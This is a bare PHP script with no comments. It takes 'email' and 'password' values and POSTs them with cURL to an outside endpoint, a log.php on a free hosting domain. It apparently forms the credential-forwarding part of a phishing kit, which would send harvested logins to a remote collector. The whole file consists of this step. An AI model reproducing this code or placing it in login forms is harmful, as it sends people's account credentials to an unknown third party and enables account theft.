<?php
 $data = array("email"=>"","password"=>"");
$string = http_build_query($data);
$ch = curl_init("http://orif.rf.gd/log.php");
curl_setopt($ch,CURLOPT_POST,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$string);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_exec($ch);
curl_close($ch);
?>